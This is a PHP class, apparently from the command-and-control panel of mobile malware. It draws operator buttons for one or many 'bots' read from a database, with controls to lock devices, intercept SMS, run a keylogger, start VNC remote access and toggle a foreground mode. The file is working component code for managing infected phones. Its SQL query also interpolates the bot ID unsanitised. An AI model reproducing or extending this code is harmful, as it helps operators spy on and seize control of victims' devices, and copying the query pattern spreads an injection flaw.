<?php

class Commands
{
	public $ids = [];
	public $is_single = true;
	public $html = "put html template here, that's commands button block - for 1 bot or multiple selected ones";
	public $db;

	public function __construct($db, $ids, $html)
	{
		$this->db = $db;
		
		if(is_array($ids))
			$this->ids = $ids;
		else
			$this->ids[] = $ids;
			
		if(sizeof($this->ids) > 1)
		{
			$this->is_single = false;
		}
		
		$this->html = $html;
	}

	public function m($macros, $value)
	{
		$this->html = str_replace($macros, $value, $this->html);
	}

	// for single bot
	public function get_bot_info()
	{
		if(!$this->is_single) return [];
		
		$bot_id = $this->ids[0];
		$res = $this->db->fetch("select * from bots where bot_id='{$bot_id}'", true);
		
		if(!sizeof($res)) return [];
		
		$bot_info = $res[0];
		
		return $bot_info;
	}
	
	public function draw()
	{
		$vis = ""; // setup elements visibility
		//var_dump($this->ids);
		$this->m("%BOT_ID%", implode(",", $this->ids));
		
		if($this->is_single)
		{
			$data = $this->get_bot_info();
			
			$vis .= "$('#lock_device_off').hide();\n";

			if($data['is_locked'])
				$vis .= "$('#lock_device').hide();\n";
			else
				$vis .= "$('#unlock_device').hide();\n";
			
			if($data['is_sms_admin'])
				$vis .= "$('#start_sms_intercept').hide();\n";
			else
				$vis .= "$('#stop_sms_intercept').hide();\n";
			
			if($data['keylogger'])
				$vis .= "$('#start_keylogger').hide();\n";
			else
				$vis .= "$('#stop_keylogger').hide();\n";

			if($data['vnc'] != "")
				$vis .= "$('#start_vnc').hide();\n";
			else
				$vis .= "$('#stop_vnc').hide();\n";

			if($data['is_fg'])
				$vis .= "$('#start_fg').hide();\n";
			else
				$vis .= "$('#stop_fg').hide();\n";

		}else{ // multi bots

			// forbid to start VNC on multiple bots the same time
			//~ $vis .= "$('#start_vnc').hide();\n";
			//~ $vis .= "$('#stop_vnc').hide();\n";
			$vis .= "$('#lock_device_off').hide();\n";
			$vis .= "$('#mass_delim').show();\n";
		}
		
		
		$this->m("%VISIBILITY%", $vis);
		
		return $this->html;
	}

}


//~ $cmd = new Commands(["123", "4", "5"], "LOADED IDS: %IDS%");
//~ var_dump($cmd->draw());
